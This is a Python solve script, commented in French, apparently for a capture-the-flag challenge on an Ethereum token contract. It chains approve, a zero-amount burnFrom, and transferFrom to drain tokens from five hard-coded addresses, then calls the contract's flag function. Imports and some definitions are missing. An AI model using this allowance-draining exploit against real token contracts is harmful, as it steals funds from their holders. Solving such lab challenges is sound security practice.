def stealAccount(web3, signer, contract, addressToSteal):
    try:
        tx = contract.functions.approve(addressToSteal, web3.toWei(1, 'ether')).transact({'from': signer})
        web3.eth.waitForTransactionReceipt(tx)
        tx = contract.functions.burnFrom(addressToSteal, 0).transact({'from': signer})
        web3.eth.waitForTransactionReceipt(tx)
        tx = contract.functions.transferFrom(addressToSteal, signer, web3.toWei(1, 'ether')).transact({'from': signer})
        web3.eth.waitForTransactionReceipt(tx)
    except:
        print("Un problème est arrivé en essayant de voler l'adresse : ", addressToSteal)
        exit(1)


def main():
    # Connexion au nœud JSON-RPC
    web3 = Web3(Web3.HTTPProvider(rpc_url))
    signer = web3.eth.accounts[0]
    contract_address = input("Rentez l'adresse du contrat donnée par netcat :")
    if not web3.isAddress(contract_address):
        print("L'adresse n'est pas valide")
        exit(1)
    try:
        contract_address = Web3.toChecksumAddress(contract_address)
        contract = web3.eth.contract(address=contract_address, abi=contract_abi)

        # Balance initiale
        print("Ma balance initiale est de : ", contract.functions.balanceOf(signer).call())

        accountsToSteal = ["0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5", "0x779f05969a12c992A91C1C096C29A17db1143F24",
                           "0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5", "0x388C818CA8B9251b393131C08a736A67ccB19297",
                           "0x690B9A9E9aa1C9dB991C7721a92d351Db4FaC990"]
        for account in accountsToSteal:
            account = Web3.toChecksumAddress(account)
            stealAccount(web3, signer, contract, account)

        print("Succès -> Vous avez volé les comptes suivants : ", accountsToSteal)
        tx = contract.functions.flag().transact({'from': signer})
        web3.eth.waitForTransactionReceipt(tx)
        print("Vous pouvez maintenant récupérer votre flag via le netcat")
    except:
        print("Erreur : Il y a eu un problème.")
        exit(1)


if __name__ == '__main__':
    main()
